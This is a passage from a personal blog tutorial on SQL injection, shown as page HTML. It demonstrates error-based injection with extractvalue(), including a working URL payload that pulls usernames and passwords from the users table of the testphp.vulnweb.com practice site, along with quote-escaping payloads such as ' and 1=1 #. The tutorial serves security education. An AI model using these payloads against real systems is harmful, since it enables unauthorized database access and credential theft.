fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">SELECT</span> <span class="p">(</span><span class="n">some</span> <span class="n">unknown</span> <span class="n">column</span> <span class="n">names</span><span class="p">)</span> <span class="n">FROM</span> <span class="n">listproducts</span> <span class="n">WHERE</span> <span class="n">cat</span><span class="o">=</span><span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">database</span><span class="p">()))</span>
</pre></table></code></div></div><p><br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql16.jpg" alt="Desktop View" /> <br /> This time we have returned a function result as an error message and modified the function as we wanted. <br /> As you can see from the picure, result of the <code class="language-plaintext highlighter-rouge">database()</code> helper function <strong>acuart</strong> is in the error message.</p><h3 id="extract-value-with-subquery">Extract value with subquery</h3><p>Instead of passing <code class="language-plaintext highlighter-rouge">database()</code> function as a second argument for <code class="language-plaintext highlighter-rouge">ExtractValue()</code> method, creating subquery with <code class="language-plaintext highlighter-rouge">()</code> will allow you to write your own queries. <br /> <strong>I am assuming that you read the previous chapters and got the table names already for this example.</strong> <br /> <a href="http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22 Password:%22,pass) FROM users)))">http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22 Password:%22,pass) FROM users)))</a> <br /> <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql17.jpg" alt="Desktop View" /> <br /></p><h2 id="1-and-11--and-1--or-11-">(1â€™ and 1=1 #) AND (1 â€˜ or 1=1 #)</h2><p>We have figured out the existence of the SQLi with <strong>2-1</strong>.However this due to the fact that, the code at the backend is written in this syntax:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span>
</pre></table></code></div></div><p>When we make a request to the <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=2-1</code>, the server side code interpret and runs query like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span>
<span class="c1">--Which returns</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span>   <span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
</pre></table></code></div></div><p>However the code could have written like this either:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat ='"</span> <span class="o">+</span> <span class="nb">id</span> <span class="o">+</span> <span class="s">"'"</span>
<span class="c1">#OR
</span><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="sa">f</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat  ='</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">'"</span>
</pre></table></code></div></div><p>When this is the case, if you pass <strong>2-1</strong> to the parameter and make the same <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=2-1</code> request, the query would interpreted like the following, because string formatting is different in this case. As we discussed, both <code class="language-plaintext highlighter-rouge">'1'</code> and <code class="language-plaintext highlighter-rouge">1</code> parameters passed to the query will return the same result but <code class="language-plaintext highlighter-rouge">'2-1'</code> will not.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="s1">'2-1'</span>
<span class="c1">--Which returns</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
</pre></table></code></div></div><p>When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operations on the database. <br /> This is where we need to use those <code class="language-plaintext highlighter-rouge">'or 1=1 #</code> or <code class="language-plaintext highlighter-rouge">'and 1=1 #</code>.</p><p><strong>Let me remind you the discipline we should follow</strong> <br /> 1-Declare a reference point <br /> 2-Try to get back there with an unexpected behavior <br /> Lets use <code class="language-plaintext highlighter-rouge">' and 1=1 #</code> to make the request like this <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=1' and1=1 #</code>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">query</span><span class="o">=</span><span class="sa">f</span><span class="s">"SELECT * FROM news WHERE id ='</span><span class="si">{</span><span class="mi">1</span><span class="s">' and 1=1 #</span><span class="si">}</span><span class="s">'"</span>
</pre></table></code></div></div><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="k">new</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
</pre></table></code></div></div><p>This will bring entries which have id of <strong>1</strong>, and means that web application vulnerable to SQLi, from now on you can do everything same as before to extract data the database.</p><h2 id="vulnweb---blind-sqli">VULNWEB - BLIND SQLi</h2><p>As you remember this was the pseudo code for testphp.vulnweb.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">pass</span>
</pre></table></code></div></div><p>Lets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error !!!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
    <span class="c1">#for i in result:
</span>    <span class="c1">#    print(i.title)
</span>    <span class="c1">#    print(i.img)
</span>    <span class="c1">#    print(i.description)
</span>    <span class="c1">#    print(i.author)
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"Query succesfull !"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">pass</span>
</pre></table></code></div></div><p>If this was the case, we could not see any result of the query on the screen, neither images nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ? <br /> <br /> <br /> To be continued</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/cyber-security/'>cyber-security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >sql-injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SQL Injection - Burak Baris&url=https://krygennn.github.io/posts/sql-injection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SQL Injection - Burak Baris&u=https://krygennn.github.io/posts/sql-injection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=SQL Injection - Burak Baris&url=https://krygennn.github.io/posts/sql-injection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://krygennn.github.io/posts/sql-injection/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/unquoted-service-path-vulnerability/">Unquoted Service Path Vulnerability</a><li><a href="/posts/ipv4-addresses/">IPv4 Protocol</a><li><a href="/posts/tryhackme-steel-mountain-ctf-writeup/">Tryhackme Steel Mountain CTF Writeup</a><li><a href="/posts/tryhackme-blue-ctf-writeup/">Tryhackme Blue Ctf Writeup</a><li><a href="/posts/subnetting/">Subnetting</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/remote-code-execution/">remote-code-execution</a> <a class="post-tag" href="/tags/unqoted-service-path/">unqoted-service-path</a> <a class="post-tag" href="/tags/windows-privesc/">windows-privesc</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/arch-linux/">arch-linux</a> <a class="post-tag" href="/tags/boot-managers/">boot-managers</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-blue-ctf-writeup/"><div class="card-body"> <span class="timeago small" >Oct 9<i class="unloaded">2021-10-09T00:59:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Blue Ctf Writeup</h3><div class="text-muted small"><p> Solve YourselfÂ Â» Blue is a machine that specifically designed to cover EternalBlue (CVE-2017-0144), which allows remote attackers to execute arbitrary code via crafted packets, aka â€œWindows SMB ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-vulnversity-ctf-writeup/"><div class="card-body"> <span class="timeago small" >Oct 9<i class="unloaded">2021-10-09T18:04:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Vulnversity Ctf Writeup</h3><div class="text-muted small"><p> Solve YourselfÂ Â» Vulnversity is a machine that combines reconnaissance, web attack vectors and privilege escalation methods together. 1-Enumeration Letâ€™s start with enumerating the host.I will u...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-steel-mountain-ctf-writeup/"><div class="card-body"> <span class="timeago small" >Dec 23<i class="unloaded">2021-12-23T00:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Steel Mountain CTF Writeup</h3><div class="text-muted small"><p> Solve YourselfÂ Â» The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit two different vulnerabilities that occur on the system. FIRST METHOD 1-Prepe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/downgrading-broken-packages/" class="btn btn-outline-primary" prompt="Older"><p>Downgrading Broken Packages</p></a> <a href="/posts/subnetting/" class="btn btn-outline-primary" prompt="Newer"><p>Subnetting</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://twitter.com/Krygen2">Burak Baris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/remote-code-execution/">remote code execution</a> <a class="post-tag" href="/tags/unqoted-service-path/">unqoted service path</a> <a class="post-tag" href="/tags/windows-privesc/">windows privesc</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/arch-linux/">arch linux</a> <a class="post-tag" href="/tags/boot-managers/">boot managers</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
